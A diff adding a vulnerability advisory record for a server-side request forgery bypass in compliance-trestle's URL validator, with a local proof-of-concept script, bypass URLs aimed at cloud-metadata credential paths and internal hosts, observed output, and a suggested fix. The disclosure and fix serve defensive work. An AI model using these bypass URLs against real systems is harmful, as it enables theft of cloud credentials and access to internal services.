@@ -1,0 +1,168 @@
+{
+  "id": "PYSEC-2026-3659",
+  "modified": "2026-08-19T12:45:04.198257426Z",
+  "published": "2026-08-19T11:56:25.978594Z",
+  "aliases": [
+    "CVE-2026-52776",
+    "GHSA-h47f-gmjp-m7rr"
+  ],
+  "summary": "compliance-trestle has an URLSecurityValidator SSRF allowlist bypass via IPv4-mapped IPv6 and 0.0.0.0",
+  "details": "### Summary\n\n`compliance-trestle` 4.0.3 (latest) ships an `URLSecurityValidator` in `trestle/core/remote/security.py` to block SSRF to loopback / link-local / cloud-metadata endpoints from the HTTPSFetcher and SFTPFetcher remote-fetch paths. The allowlist is incomplete and can be bypassed by four equivalent address representations that resolve to the same blocked host but evade the validator's checks:\n\n- IPv4-mapped IPv6 literals (`[::ffff:169.254.169.254]`, `[::ffff:127.0.0.1]`, `[::ffff:10.0.0.1]`) are returned by `socket.getaddrinfo` as `IPv6Address` objects; `IPv6Address in IPv4Network('169.254.0.0/16')` returns `False`, so the `_check_blocked_networks` and `_check_private_networks` predicates do not match.\n- IPv4 unspecified address `0.0.0.0` is not in `ALWAYS_BLOCKED_NETWORKS` (which covers `127.0.0.0/8` but not `0.0.0.0/8`); on Linux + Docker, `0.0.0.0` routes to local services on any interface, and on dual-stack-mapped sockets it also reaches loopback listeners.\n\nA malicious OSCAL profile referencing one of these URLs in `imports[*].href` or `back-matter.resources[*].rlinks[*].href` causes `HTTPSFetcher.__init__` and `_do_fetch` (which both invoke `validator.validate_url`) to pass the URL through to `requests.get`, contacting cloud-metadata services, loopback admin interfaces, or RFC 1918 internal networks (with `TRESTLE_BLOCK_PRIVATE_IPS=true` set) that the validator was specifically designed to block.\n\n### Affected versions\n\n`compliance-trestle` (PyPI) versions `\u003c= 4.0.3` are affected. 4.0.3 (released 2026-05-20) is the latest release and the one that introduced `URLSecurityValidator`; prior releases had no SSRF guard at all.\n\n### Privilege required\n\nNetwork-position attacker who can supply or influence an OSCAL artifact (profile / catalog / SSP / component-definition) that compliance-trestle subsequently fetches via `HTTPSFetcher` or `SFTPFetcher`. The most realistic vector is a malicious OSCAL profile whose `imports[*].href` references one of the bypass URLs; the artifact then flows through `trestle href add` / `trestle import` / `trestle assemble` / `trestle author` / any workflow that resolves the profile's imports.\n\n### Root cause\n\n`trestle/core/remote/security.py` (4.0.3, lines 56-71 + 156-167):\n\n```python\nALWAYS_BLOCKED_NETWORKS = [\n    ipaddress.ip_network('127.0.0.0/8'),     # IPv4 loopback only\n    ipaddress.ip_network('::1/128'),         # IPv6 loopback (single address)\n    ipaddress.ip_network('169.254.0.0/16'),  # IPv4 link-local only\n    ipaddress.ip_network('fe80::/10'),       # IPv6 link-local\n]\n\nMETADATA_HOSTNAMES = {\n    '169.254.169.254',          # IPv4 literal only\n    'metadata.google.internal',\n    'metadata.azure.com',\n    '100.100.100.200',\n}\n\ndef _check_blocked_networks(self, ip_addr, hostname):\n    for network in ALWAYS_BLOCKED_NETWORKS:\n        if ip_addr in network:  # IPv6Address in IPv4Network -\u003e False\n            raise TrestleError(...)\n```\n\nFour independent gaps:\n\n1. **No IPv4-mapped IPv6 normalization.** `socket.getaddrinfo('::ffff:169.254.169.254', None)` returns an `IPv6Address`. Python's `ipaddress` module raises `TypeError` if mixed types are compared, and the `in` operator suppresses that to `False`. The validator never calls `.ipv4_mapped` to canonicalize before the membership check, so any always-blocked IPv4 range is bypassable via the `[::ffff:N.N.N.N]` literal.\n\n2. **`METADATA_HOSTNAMES` is an exact-string set.** The hostname for `https://[::ffff:169.254.169.254]/` is `::ffff:169.254.169.254`, which is not in the set.\n\n3. **`0.0.0.0` is not blocked.** `0.0.0.0` is not in any of the four `ALWAYS_BLOCKED_NETWORKS` ranges. On Linux and inside containers, connecting to `0.0.0.0` routes to local services on any interface (a common SSRF technique against Docker / orchestrator agents on `0.0.0.0:PORT`).\n\n4. **DNS rebinding ribbon is only one IP deep.** `_resolve_hostname` records the first `getaddrinfo` result set, but a hostname with mixed records can still serve a private IP on the second resolution `validator.validate_url(self._url)` performs in `_do_fetch`. The IPv4-mapped-IPv6 bypass already eliminates the need for rebinding.\n\nSibling code paths sharing the same defect: `SFTPFetcher.__init__` (lines 359-365 of `cache.py`) wires the identical `URLSecurityValidator` and inherits all four gaps.\n\n### Reproduction (E2E against `pip install compliance-trestle==4.0.3` + local IMDS simulator)\n\n```bash\n# 1. Setup\nmkdir -p /tmp/poc-trestle \u0026\u0026 cd /tmp/poc-trestle\npython3.12 -m venv venv   # any supported runtime (requires-python \u003e= 3.10); 3.12.13 chosen because \u003e= 3.12.4 it carries CPython CVE-2024-4032's is_global fix, proving this bypass is is_global-INDEPENDENT\n./venv/bin/pip install --quiet compliance-trestle==4.0.3\n./venv/bin/pip show compliance-trestle | head -2\n# Name: compliance-trestle\n# Version: 4.0.3\n\n# 2. Driver\ncat \u003e e2e_full.py \u003c\u003c'PY'\nimport http.server, http.client, socket, socketserver, threading, time, os\nfrom urllib.parse import urlparse\nfrom trestle.core.remote.security import URLSecurityValidator, get_block_private_ips_config\nfrom trestle.common.err import TrestleError\n\nclass IMDS(http.server.BaseHTTPRequestHandler):\n    def do_GET(self):\n        body = b'{\"Code\":\"Success\",\"AccessKeyId\":\"AKIA_PWNED_VIA_TRESTLE_SSRF\",\"SecretAccessKey\":\"REDACTED\",\"Token\":\"FAKE_IMDS_RESPONSE\"}'\n        self.send_response(200); self.send_header(\"Content-Length\", str(len(body))); self.end_headers(); self.wfile.write(body)\n    def log_message(self, *a, **kw): pass\n\nclass DualStack(socketserver.ThreadingMixIn, http.server.HTTPServer):\n    address_family = socket.AF_INET6\n    def server_bind(self):\n        try: self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)\n        except (AttributeError, OSError): pass\n        super().server_bind()\n\nPORT = 18560\nsrv = DualStack((\"::\", PORT), IMDS)\nthreading.Thread(target=srv.serve_forever, daemon=True).start()\ntime.sleep(0.2)\n\nvalidator = URLSecurityValidator(block_private_ips=True)\ndef attempt(label, url, expect_block):\n    try:\n        validator.validate_url(url); verdict, blocked = \"VALIDATION PASSED\", False\n    except TrestleError as e:\n        verdict, blocked = f\"BLOCKED: {str(e)[:80]}\", True\n    meta = \"(expected)\" if blocked == expect_block else \"(*** UNEXPECTED ***)\"\n    print(f\"\\n[{label}]\\n  URL: {url}\\n  Validator: {verdict}  {meta}\")\n    if not blocked:\n        try:\n            p = urlparse(url); c = http.client.HTTPConnection(p.hostname, p.port or 443, timeout=3)\n            c.request(\"GET\", p.path or \"/\"); r = c.getresponse(); print(f\"  Connectivity: HTTP {r.status}, body[:60]={r.read()[:60]!r}\"); c.close()\n        except Exception as e:\n            print(f\"  Connectivity: {type(e).__name__}: {str(e)[:80]}\")\n\n# Negative controls (validator must block)\nattempt(\"NEG-1: literal 169.254.169.254\", f\"https://169.254.169.254:{PORT}/latest/meta-data/\", True)\nattempt(\"NEG-2: literal 127.0.0.1\", f\"https://127.0.0.1:{PORT}/admin\", True)\nattempt(\"NEG-3: metadata.google.internal\", f\"https://metadata.google.internal:{PORT}/\", True)\nattempt(\"NEG-4: literal 10.0.0.1 RFC1918\", f\"https://10.0.0.1:{PORT}/admin\", True)\n# Bypasses (validator should block, but does not)\nattempt(\"BYPASS-1: IPv4-mapped IPv6 cloud-metadata\", f\"https://[::ffff:169.254.169.254]:{PORT}/latest/meta-data/iam/security-credentials/admin\", True)\nattempt(\"BYPASS-2: 0.0.0.0 reaches localhost\", f\"https://0.0.0.0:{PORT}/admin\", True)\nattempt(\"BYPASS-3: IPv4-mapped IPv6 loopback\", f\"https://[::ffff:127.0.0.1]:{PORT}/admin\", True)\nattempt(\"BYPASS-4: IPv4-mapped IPv6 RFC 1918\", f\"https://[::ffff:10.0.0.1]:{PORT}/admin\", True)\nsrv.shutdown()\nPY\n\n# 3. Run\n./venv/bin/python e2e_full.py\n```\n\nObserved output on a supported runtime, Python 3.12.13 / macOS Darwin 25.3.0 (verbatim). Note 3.12.13 is \u003e= 3.12.4, so CPython CVE-2024-4032's `is_global`/`is_private` reclassification IS active here; the bypass nevertheless works because this validator uses `IPv6Address in IPv4Network(...)` membership (which silently returns False for cross-version comparison), NOT the `is_global` predicate. The mechanism is therefore robust to CPython version:\n\n```\nPython: 3.12.13\ncompliance-trestle: 4.0.3\n  ::ffff:169.254.169.254       is_global=False  is_private=True  in IPv4Network('169.254.0.0/16')=False\n  ::ffff:127.0.0.1             is_global=False  is_private=True  in IPv4Network('169.254.0.0/16')=False\n  ::ffff:10.0.0.1              is_global=False  is_private=True  in IPv4Network('169.254.0.0/16')=False\n\n[NEG-1: literal 169.254.169.254]\n  URL: https://169.254.169.254:18560/latest/meta-data/\n  Validator: BLOCKED: Access to cloud metadata endpoints is not allowed: 169.254.169.254. This is a se  (expected)\n\n[NEG-2: literal 127.0.0.1]\n  URL: https://127.0.0.1:18560/admin\n  Validator: BLOCKED: Access to 127.0.0.0/8 addresses is blocked: 127.0.0.1 resolves to 127.0.0.1. Thi  (expected)\n\n[NEG-3: metadata.google.internal]\n  URL: https://metadata.google.internal:18560/\n  Validator: BLOCKED: Access to cloud metadata endpoints is not allowed: metadata.google.internal. Thi  (expected)\n\n[NEG-4: literal 10.0.0.1 RFC1918]\n  URL: https://10.0.0.1:18560/admin\n  Validator: BLOCKED: Access to private IP addresses is blocked: 10.0.0.1 resolves to 10.0.0.1 which i  (expected)\n\n[BYPASS-1: IPv4-mapped IPv6 cloud-metadata]\n  URL: https://[::ffff:169.254.169.254]:18560/latest/meta-data/iam/security-credentials/admin\n  Validator: VALIDATION PASSED  (*** UNEXPECTED ***)\n  Connectivity: TimeoutError: timed out\n\n[BYPASS-2: 0.0.0.0 reaches localhost]\n  URL: https://0.0.0.0:18560/admin\n  Validator: VALIDATION PASSED  (*** UNEXPECTED ***)\n  Connectivity: HTTP 200, body[:60]=b'{\"Code\":\"Success\",\"AccessKeyId\":\"AKIA_PWNED_VIA_TRESTLE_SSRF'\n\n[BYPASS-3: IPv4-mapped IPv6 loopback]\n  URL: https://[::ffff:127.0.0.1]:18560/admin\n  Validator: VALIDATION PASSED  (*** UNEXPECTED ***)\n  Connectivity: HTTP 200, body[:60]=b'{\"Code\":\"Success\",\"AccessKeyId\":\"AKIA_PWNED_VIA_TRESTLE_SSRF'\n\n[BYPASS-4: IPv4-mapped IPv6 RFC 1918]\n  URL: https://[::ffff:10.0.0.1]:18560/admin\n  Validator: VALIDATION PASSED  (*** UNEXPECTED ***)\n  Connectivity: RemoteDisconnected: Remote end closed connection without response\n```\n\n(The bracketed-IPv6 diagnostic lines above are the load-bearing proof of `is_global`-independence: even with CPython's CVE-2024-4032 fix active (`is_global=False`, `is_private=True`), the validator's `in IPv4Network(...)` membership check still returns `False`, so the bypass is not contingent on running an older Python. BYPASS-1/BYPASS-4 show the guard passing the URL; their connectivity lines time out only because the local sentinel listens on loopback/`::`, not on those literal addresses -- the security-relevant result is the validator passing, which on a real dual-stack host routes to the embedded IPv4 endpoint.)\n\nNegative controls confirm the validator works as designed for the canonical literal forms it was written to block. All four bypass URLs pass `URLSecurityValidator.validate_url()` on the latest patched release.\n\n### Impact\n\n- SSRF to AWS / Azure / GCP / Alibaba IMDS via `https://[::ffff:169.254.169.254]/latest/meta-data/iam/security-credentials/\u003crole\u003e` -\u003e short-lived role credentials exfiltrated through the cached fetch.\n- SSRF to loopback administrative interfaces via `https://0.0.0.0:PORT/` or `https://[::ffff:127.0.0.1]:PORT/` -\u003e access to local-only admin endpoints (Docker socket on `unix://`, Prometheus, etcd, Kubelet) that the validator was supposed to deny.\n- SSRF to RFC 1918 internal services via `https://[::ffff:10.0.0.1]/...` even when `TRESTLE_BLOCK_PRIVATE_IPS=true` is explicitly set, defeating the operator's defense-in-depth posture.\n- The cache-write traversal protection (`PathSecurityValidator.validate_url_path_for_cache` + `validate_cache_path`) is orthogonal and remains effective; this advisory is scoped to the SSRF allowlist gap only.\n\n### Suggested fix\n\nNormalize every resolved IP to its canonical IPv4 form before membership checks, and add `0.0.0.0` to the always-blocked set. Diff sketch against `trestle/core/remote/security.py`:\n\n```python\nALWAYS_BLOCKED_NETWORKS = [\n    ipaddress.ip_network('127.0.0.0/8'),\n    ipaddress.ip_network('::1/128'),\n    ipaddress.ip_network('169.254.0.0/16'),\n    ipaddress.ip_network('fe80::/10'),\n    ipaddress.ip_network('0.0.0.0/8'),     # IPv4 \"this network\", reaches localhost on Linux\n    ipaddress.ip_network('::/128'),        # IPv6 unspecified\n]\n\ndef _canonicalize_ip(self, ip_addr):\n    \"\"\"Map IPv4-mapped IPv6 addresses (::ffff:a.b.c.d) to their IPv4 form.\"\"\"\n    if isinstance(ip_addr, ipaddress.IPv6Address) and ip_addr.ipv4_mapped is not None:\n        return ip_addr.ipv4_mapped\n    return ip_addr\n\ndef _check_blocked_networks(self, ip_addr, hostname):\n    ip_addr = self._canonicalize_ip(ip_addr)\n    for network in ALWAYS_BLOCKED_NETWORKS:\n        if ip_addr.version == network.version and ip_addr in network:\n            raise TrestleError(...)\n\ndef _check_private_networks(self, ip_addr, hostname):\n    ip_addr = self._canonicalize_ip(ip_addr)\n    # ... same canonicalization before block_private_ip / warn_private_ip\n```\n\nAlso add the canonicalized literal to `_check_metadata_endpoints`:\n\n```python\ndef _check_metadata_endpoints(self, hostname):\n    # Canonicalize bracketed IPv6 literal hostnames before exact-match\n    canonical = hostname.strip('[]')\n    try:\n        canonical_ip = ipaddress.ip_address(canonical)\n        if isinstance(canonical_ip, ipaddress.IPv6Address) and canonical_ip.ipv4_mapped:\n            canonical = str(canonical_ip.ipv4_mapped)\n    except ValueError:\n        pass\n    if canonical in METADATA_HOSTNAMES:\n        raise TrestleError(...)\n```\n\nThis mirrors the canonicalization pattern that pyca/cryptography, rustls-webpki, and the recent Node `undici` SSRF patches converged on after similar IPv6-mapped bypasses surfaced in 2024-2025.\n\n### Credit\n\nReported by tonghuaroot.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "compliance-trestle",
+        "purl": "pkg:pypi/compliance-trestle"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "4.1.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.0.2",
+        "0.0.3",
+        "0.1.0",
+        "0.1.1",
+        "0.10.0",
+        "0.11.0",
+        "0.12.0",
+        "0.13.0",
+        "0.13.1",
+        "0.14.0",
+        "0.14.1",
+        "0.14.2",
+        "0.14.3",
+        "0.14.4",
+        "0.15.0",
+        "0.15.1",
+        "0.16.0",
+        "0.17.0",
+        "0.18.0",
+        "0.18.1",
+        "0.19.0",
+        "0.2.0",
+        "0.2.1",
+        "0.2.2",
+        "0.20.0",
+        "0.21.0",
+        "0.22.0",
+        "0.22.1",
+        "0.23.0",
+        "0.24.0",
+        "0.25.0",
+        "0.25.1",
+        "0.26.0",
+        "0.27.0",
+        "0.27.1",
+        "0.27.2",
+        "0.28.0",
+        "0.28.1",
+        "0.29.0",
+        "0.3.0",
+        "0.30.0",
+        "0.31.0",
+        "0.32.0",
+        "0.32.1",
+        "0.33.0",
+        "0.34.0",
+        "0.35.0",
+        "0.36.0",
+        "0.37.0",
+        "0.4.0",
+        "0.5.0",
+        "0.6.0",
+        "0.6.1",
+        "0.6.2",
+        "0.7.0",
+        "0.7.1",
+        "0.7.2",
+        "0.8.0",
+        "0.8.1",
+        "0.9.0",
+        "1.0.0rc0",
+        "1.0.1",
+        "1.0.2",
+        "1.1.0",
+        "1.2.0",
+        "2.0.0",
+        "2.1.0",
+        "2.1.1",
+        "2.2.0",
+        "2.2.1",
+        "2.3.0",
+        "2.3.1",
+        "2.4.0",
+        "2.5.0",
+        "2.5.1",
+        "2.6.0",
+        "2.6.1",
+        "3.0.1",
+        "3.1.0",
+        "3.10.2",
+        "3.10.3",
+        "3.10.4",
+        "3.11.0",
+        "3.12.0",
+        "3.12.1",
+        "3.12.2",
+        "3.12.3",
+        "3.12.4",
+        "3.2.0",
+        "3.3.0",
+        "3.4.0",
+        "3.5.0",
+        "3.6.0",
+        "3.7.0",
+        "3.8.0",
+        "3.8.1",
+        "3.9.0",
+        "3.9.1",
+        "3.9.2",
+        "3.9.3",
+        "4.0.0",
+        "4.0.1",
+        "4.0.2",
+        "4.0.3"
+      ],
+      "database_specific": {
+        "source": "https://github.com/pypa/advisory-database/blob/main/vulns/compliance-trestle/PYSEC-2026-3659.yaml"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/oscal-compass/compliance-trestle/security/advisories/GHSA-h47f-gmjp-m7rr"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/oscal-compass/compliance-trestle/commit/d107cd16efe8eb15d46be3c1d97f1ec73d32447c"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/oscal-compass/compliance-trestle"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://pypi.org/project/compliance-trestle"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/advisories/GHSA-h47f-gmjp-m7rr"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-52776"
+    }
+  ]
+}
